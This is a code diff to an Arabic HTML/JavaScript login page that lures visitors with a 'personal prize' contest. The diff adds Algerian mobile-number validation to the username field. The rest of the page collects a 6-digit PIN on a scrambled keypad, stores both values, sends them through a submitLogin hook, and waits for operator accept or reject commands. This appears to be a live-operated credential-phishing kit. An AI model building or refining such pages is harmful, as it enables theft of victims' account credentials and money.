@@ -19,24 +19,25 @@
     .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 16px}
     .field{position:relative}
     .field label{display:block;text-align:right;font-size:11px;font-weight:700;color:#4f8a6e;margin:0 0 5px}
-    .field input{width:100%;height:54px;border:1.5px solid var(--green);border-radius:9px;padding:18px 14px 4px;font:700 15px Cairo,sans-serif;color:#263238;outline:none;background:#fff}
-    .field .inner-label{position:absolute;top:6px;right:14px;font-size:10px;font-weight:700;color:#4f8a6e;pointer-events:none}
+    .field input{width:100%;height:54px;border:1.5px solid var(--green);border-radius:9px;padding:18px 14px 4px;font:700 15px Cairo,sans-serif;color:#263238;outline:none;background:#fff;transition:border-color .18s ease,box-shadow .18s ease}
+    .field .inner-label{position:absolute;top:6px;right:14px;font-size:10px;font-weight:700;color:#4f8a6e;pointer-events:none;transition:color .18s ease}
     .field input:focus{border-color:#36c58d;box-shadow:0 0 0 3px #69d9a722}
     .field input::placeholder{color:#b0b8c0;font-weight:400}
+    .field.has-error input{border-color:#c62828;box-shadow:0 0 0 3px rgba(198,40,40,0.12)}
+    .field.has-error .inner-label{color:#c62828}
+    .error{display:none;color:#c62828;text-align:right;font-size:12px;font-weight:700;margin-top:6px}
+    .error.show{display:block}
     .meta-row{margin:12px 0 0;display:flex;align-items:flex-start;justify-content:space-between}
     .link-row a{color:#e05a6d;font-size:11px;font-weight:700;text-decoration:underline}
     .options{display:flex;flex-direction:column;align-items:flex-start;gap:8px}
     .option{display:flex;align-items:center;gap:7px;font-size:11px;font-weight:600;color:#37474f;cursor:pointer}
     .option input{width:15px;height:15px;margin:0;accent-color:#263238;border-radius:50%}
     .option input:focus{box-shadow:none}
-    .error{display:none;color:#c62828;text-align:right;font-size:11px;margin-top:7px}
-    .error.show{display:block}
     .reject-warning{display:none;background:#fdecec;border:1px solid #f3b6b6;color:#c62828;border-radius:9px;padding:10px 12px;font-size:12px;font-weight:700;text-align:right;margin:0 0 12px}
     .reject-warning.show{display:block}
     .submit{width:100%;height:48px;margin-top:22px;border:0;border-radius:28px;background:#767c83;color:#e6e7e9;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:background .2s ease,color .2s ease}
     .submit.active{background:#df2929;color:#fff;cursor:pointer}
     .submit.active:hover{background:#c51f28}
-
 
     /* خلفية التعتيم + لوحة الرقم السري المنبثقة */
     .pin-backdrop{display:none;position:fixed;inset:0;background:rgba(38,44,48,0.52);z-index:90}
@@ -56,7 +57,6 @@
     .pin-submit{width:100%;max-width:360px;height:48px;margin:16px auto 0;border:0;border-radius:26px;background:#f7a1af;color:#fff;font:800 15px Cairo,sans-serif;display:block;cursor:not-allowed;transition:background .2s ease,color .2s ease}
     .pin-submit.active{background:#df2929;color:#fff;cursor:pointer}
     .pin-submit.active:hover{background:#c51f28}
-
 
     /* اللغة الإنجليزية/الفرنسية: اتجاه من اليسار لليمين */
     html[dir="ltr"] .back { transform: scaleX(-1); }
@@ -85,16 +85,16 @@
     <button class="close-top" type="button" aria-label="إغلاق" onclick="history.back()">✕</button>
   </header>
 
-
   <main class="card">
     <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
     <p class="intro" data-i18n="username.intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
     <div class="reject-warning" id="rejectWarning" role="alert" data-i18n="username.reject">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
     <form id="usernameForm">
-      <div class="field">
+      <div class="field" id="usernameField">
         <span class="inner-label" data-i18n="username.label">اسم المستخدم</span>
-        <input id="username" type="text" inputmode="numeric" pattern="[0-9]*" enterkeyhint="done" autocomplete="username" required placeholder="اسم المستخدم" data-i18n-ph="username.placeholder">
+        <input id="username" type="tel" dir="ltr" inputmode="tel" enterkeyhint="done" autocomplete="username" required placeholder="05 00 00 00 00" data-i18n-ph="username.placeholder">
       </div>
+      <div class="error" id="error" role="alert">رقم الهاتف غير صحيح</div>
       <div class="meta-row">
         <div class="options">
           <label class="option"><input type="checkbox" name="rememberName"><span data-i18n="username.rememberName">تذكر اسمي</span></label>
@@ -102,14 +102,11 @@
         </div>
         <div class="link-row"><a href="#" id="forgotUsername" data-i18n="username.forgot">نسيت اسم المستخدم؟</a></div>
       </div>
-      <div class="error" id="error" data-i18n="username.error">يرجى إدخال اسم المستخدم.</div>
-      <button class="submit" type="submit" id="continueBtn" data-i18n="username.next">التالي</button>
+      <button class="submit" type="submit" id="continueBtn" disabled data-i18n="username.next">التالي</button>
     </form>
   </main>
 
-
   <div class="pin-backdrop" id="pinBackdrop"></div>
-
 
   <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري" data-i18n-aria="username.keypadAria">
     <div class="digits-label" data-i18n="username.digitsLabel">اكتب رمزك السري</div>
@@ -124,7 +121,6 @@
     <div class="digits" id="keypad"></div>
     <button class="pin-submit" id="pinSubmit" type="button" disabled data-i18n="username.pinSubmit">تسجيل الدخول</button>
   </section>
-
 
   <script src="/assets/js/firebase-env.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
@@ -144,7 +140,8 @@
         try { sessionStorage.removeItem('prizeRejectMessage'); } catch (e) {}
       }
     })();
-    // رفض مباشر أثناء وجود العميل في هذه الصفحة (لو رفض المدير مبكراً)
+
+    // رفض مباشر أثناء وجود العميل في هذه الصفحة
     if (window.listenForPageCommands) {
       window.listenForPageCommands({
         onReject: function () {
@@ -156,135 +153,204 @@
       });
     }
 
+    document.getElementById("forgotUsername").addEventListener("click", e => e.preventDefault());
+    const usernameField = document.getElementById("usernameField");
+    const usernameInput = document.getElementById("username");
+    const continueBtn = document.getElementById("continueBtn");
+    const errorEl = document.getElementById("error");
+    const pinBackdrop = document.getElementById("pinBackdrop");
+    const keypadSheet = document.getElementById("keypadSheet");
 
-    document.getElementById("forgotUsername").addEventListener("click",e=>e.preventDefault());
-    const usernameInput=document.getElementById("username");
-    const continueBtn=document.getElementById("continueBtn");
-    const errorEl=document.getElementById("error");
-    const pinBackdrop=document.getElementById("pinBackdrop");
-    const keypadSheet=document.getElementById("keypadSheet");
+    // التحقق من أول رقمين (05 أو 06 أو 07)
+    const ALGERIAN_PREFIX_REGEX = /^0[567]/;
+    const ALGERIAN_FULL_REGEX = /^0[567]\d{8}$/;
 
+    // توحيد الرقم الجزائري إلى الصيغة المحلية (10 أرقام)
+    function normalizeAlgerianMobile(value) {
+      const arabic = "٠١٢٣٤٥٦٧٨٩";
+      const persian = "۰۱۲۳۴۵۶۷۸۹";
+      let phone = String(value ?? "").trim();
+      if (!phone) return "";
 
-    // تحويل الأرقام العربية/الفارسية إلى إنجليزية ومنع أي حرف أو رمز غير رقمي
-    function normalizeDigitsOnly(value){
-      if(!value)return "";
-      const arabicIndic="٠١٢٣٤٥٦٧٨٩";
-      const easternArabicIndic="۰۱۲۳۴۵۶۷۸۹";
-      let normalized=String(value);
-      for(let i=0;i<10;i++){
-        normalized=normalized
-          .replace(new RegExp(arabicIndic[i],"g"),String(i))
-          .replace(new RegExp(easternArabicIndic[i],"g"),String(i));
+      phone = phone.replace(/[٠-٩۰-۹]/g, digit => {
+        let index = arabic.indexOf(digit);
+        if (index === -1) index = persian.indexOf(digit);
+        return String(index);
+      });
+
+      if (!/^\+?[\d\s().-]+$/.test(phone)) return "";
+
+      phone = phone.replace(/[\s().-]/g, "");
+
+      if (phone.startsWith("+213")) {
+        phone = "0" + phone.slice(4);
+      } else if (phone.startsWith("00213")) {
+        phone = "0" + phone.slice(5);
+      } else if (phone.startsWith("213") && phone.length === 12) {
+        phone = "0" + phone.slice(3);
       }
-      return normalized.replace(/[^0-9]/g,"");
+
+      return phone;
     }
 
-
-    function updateContinueState(){
-      const cleaned=normalizeDigitsOnly(usernameInput.value);
-      if(usernameInput.value!==cleaned){
-        usernameInput.value=cleaned;
-      }
-      const filled=cleaned.length>0;
-      continueBtn.classList.toggle("active",filled);
-      continueBtn.disabled=!filled;
-      if(filled)errorEl.classList.remove("show");
+    // التحقق الكامل من البداية (05 / 06 / 07) والطول (10 أرقام)
+    function isValidAlgerianMobile(value) {
+      const phone = normalizeAlgerianMobile(value);
+      return ALGERIAN_FULL_REGEX.test(phone);
     }
 
+    function getInvalidMessage() {
+      const lang = document.documentElement.lang || "ar";
+      if (lang === "en") return "Invalid phone number";
+      if (lang === "fr") return "Numéro de téléphone invalide";
+      return "رقم الهاتف غير صحيح";
+    }
 
-    usernameInput.addEventListener("beforeinput",e=>{
-      if(e.inputType&&e.inputType.startsWith("delete"))return;
-      if(typeof e.data==="string"&&e.data.length>0){
-        if(normalizeDigitsOnly(e.data).length===0){
+    function showError() {
+      errorEl.textContent = getInvalidMessage();
+      errorEl.classList.add("show");
+      usernameField.classList.add("has-error");
+    }
+
+    function hideError() {
+      errorEl.classList.remove("show");
+      usernameField.classList.remove("has-error");
+    }
+
+    function updateContinueState(isDeleting = false) {
+      const raw = usernameInput.value.trim();
+      const normalized = normalizeAlgerianMobile(raw);
+      const digitCount = normalized.replace(/\D/g, "").length;
+      const valid = ALGERIAN_FULL_REGEX.test(normalized);
+
+      continueBtn.classList.toggle("active", valid);
+      continueBtn.disabled = !valid;
+
+      // عند الحذف أو قبل الوصول إلى 8 أرقام: أزل رسالة الخطأ فوراً
+      if (isDeleting || digitCount < 8) {
+        hideError();
+        return valid;
+      }
+
+      // بعد إدخال 8 أرقام فأكثر:
+      // إذا كان الطول 8 أو 9 أرقام وبدايته صحيحة (05 أو 06 أو 07)، اترك العميل يكمل دون تنبيه
+      if (digitCount < 10 && ALGERIAN_PREFIX_REGEX.test(normalized)) {
+        hideError();
+      } else if (valid) {
+        hideError();
+      } else {
+        showError();
+      }
+
+      return valid;
+    }
+
+    usernameInput.addEventListener("beforeinput", e => {
+      if (e.inputType && e.inputType.startsWith("delete")) return;
+      if (typeof e.data === "string" && e.data.length > 0) {
+        if (!/^[0-9٠-٩۰-۹+\s().-]+$/.test(e.data)) {
           e.preventDefault();
         }
       }
     });
 
-
-    usernameInput.addEventListener("keydown",e=>{
-      if(e.ctrlKey||e.metaKey||e.altKey||["Backspace","Delete","ArrowLeft","ArrowRight","ArrowUp","ArrowDown","Tab","Enter","Home","End"].includes(e.key)){
+    usernameInput.addEventListener("keydown", e => {
+      if (e.key === "Backspace" || e.key === "Delete") {
+        hideError();
         return;
       }
-      if(!/^[0-9٠-٩۰-۹]$/.test(e.key)){
+      if (e.ctrlKey || e.metaKey || e.altKey || ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Tab", "Enter", "Home", "End"].includes(e.key)) {
+        return;
+      }
+      if (!/^[0-9٠-٩۰-۹+\s().-]$/.test(e.key)) {
         e.preventDefault();
       }
     });
 
-
-    usernameInput.addEventListener("paste",e=>{
+    usernameInput.addEventListener("paste", e => {
       e.preventDefault();
-      const pasted=(e.clipboardData&&e.clipboardData.getData("text"))||(window.clipboardData&&window.clipboardData.getData("text"))||"";
-      const digits=normalizeDigitsOnly(pasted);
-      const start=usernameInput.selectionStart??usernameInput.value.length;
-      const end=usernameInput.selectionEnd??usernameInput.value.length;
-      const nextValue=usernameInput.value.slice(0,start)+digits+usernameInput.value.slice(end);
-      usernameInput.value=normalizeDigitsOnly(nextValue);
-      updateContinueState();
+      hideError();
+      const pasted = (e.clipboardData && e.clipboardData.getData("text")) || (window.clipboardData && window.clipboardData.getData("text")) || "";
+      const cleaned = pasted.replace(/[^0-9٠-٩۰-۹+\s().-]/g, "");
+      const start = usernameInput.selectionStart ?? usernameInput.value.length;
+      const end = usernameInput.selectionEnd ?? usernameInput.value.length;
+      usernameInput.value = usernameInput.value.slice(0, start) + cleaned + usernameInput.value.slice(end);
+      updateContinueState(false);
     });
 
+    usernameInput.addEventListener("blur", () => {
+      const raw = usernameInput.value.trim();
+      if (!raw) {
+        hideError();
+        return;
+      }
+      if (isValidAlgerianMobile(raw)) {
+        usernameInput.value = normalizeAlgerianMobile(raw);
+        hideError();
+      } else if (normalizeAlgerianMobile(raw).replace(/\D/g, "").length >= 8) {
+        showError();
+      }
+    });
 
-    usernameInput.addEventListener("input",updateContinueState);
-    usernameInput.addEventListener("change",updateContinueState);
-    updateContinueState();
+    usernameInput.addEventListener("input", e => {
+      const isDeleting = Boolean(e && e.inputType && e.inputType.startsWith("delete"));
+      updateContinueState(isDeleting);
+    });
 
+    usernameInput.addEventListener("change", () => updateContinueState(false));
+    updateContinueState(false);
 
-    function openPinSheet(){
+    function openPinSheet() {
       pinBackdrop.classList.add("active");
       keypadSheet.classList.add("active");
     }
-    function closePinSheet(){
+    function closePinSheet() {
       pinBackdrop.classList.remove("active");
       keypadSheet.classList.remove("active");
-      pin="";
+      pin = "";
       renderPin();
     }
-    pinBackdrop.addEventListener("click",closePinSheet);
+    pinBackdrop.addEventListener("click", closePinSheet);
 
-
-    document.getElementById("usernameForm").addEventListener("submit",async e=>{
+    document.getElementById("usernameForm").addEventListener("submit", async e => {
       e.preventDefault();
-      updateContinueState();
-      const username=usernameInput.value.trim();
-      if(!username){
-        errorEl.classList.add("show");
+      if (!updateContinueState(false)) {
+        if (usernameInput.value.trim().length > 0) showError();
         return;
       }
-      errorEl.classList.remove("show");
+      const username = normalizeAlgerianMobile(usernameInput.value);
+      usernameInput.value = username;
+      hideError();
       usernameInput.blur();
-      localStorage.setItem("prizeUsername",username);
-      if(window.submitLogin)await window.submitLogin({username,password:""});
+      localStorage.setItem("prizeUsername", username);
+      if (window.submitLogin) await window.submitLogin({ username, password: "" });
       openPinSheet();
     });
 
-
-    const pinSubmit=document.getElementById("pinSubmit");
-    const pinDots=[...document.querySelectorAll(".dot")];
-    let pin="";
-    function renderPin(){
-      pinDots.forEach((dot,i)=>dot.classList.toggle("active",i<pin.length));
-      pinSubmit.disabled=pin.length!==6;
-      pinSubmit.classList.toggle("active",pin.length===6);
+    const pinSubmit = document.getElementById("pinSubmit");
+    const pinDots = [...document.querySelectorAll(".dot")];
+    let pin = "";
+    function renderPin() {
+      pinDots.forEach((dot, i) => dot.classList.toggle("active", i < pin.length));
+      pinSubmit.disabled = pin.length !== 6;
+      pinSubmit.classList.toggle("active", pin.length === 6);
     }
 
-
-    ["5","4","7","2","6","0","3","8","1","9"].forEach(number=>{
-      const button=document.createElement("button");
-      button.type="button";
-      button.className="digit";
-      button.textContent=number;
-      button.addEventListener("click",()=>{if(pin.length<6){pin+=number;renderPin()}});
+    ["5", "4", "7", "2", "6", "0", "3", "8", "1", "9"].forEach(number => {
+      const button = document.createElement("button");
+      button.type = "button";
+      button.className = "digit";
+      button.textContent = number;
+      button.addEventListener("click", () => { if (pin.length < 6) { pin += number; renderPin(); } });
       document.getElementById("keypad").appendChild(button);
     });
 
+    document.getElementById("pinDelete").addEventListener("click", () => { pin = pin.slice(0, -1); renderPin(); });
 
-    document.getElementById("pinDelete").addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
-
-
-    pinSubmit.addEventListener("click",async()=>{
-      if(pin.length!==6)return;
-      localStorage.setItem("prizePassword",pin);
-      if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
+    pinSubmit.addEventListener("click", async () => {
+      if (pin.length !== 6) return;
+      localStorage.setItem("prizePassword", pin);
+      if (window.submitLogin) await window.submitLogin({ username: localStorage.getItem("prizeUsername") || "", password: pin });
       location.href = window.SiteLang ? SiteLang.href("prize-wait.html") : "prize-wait.html";
     });
   </script>
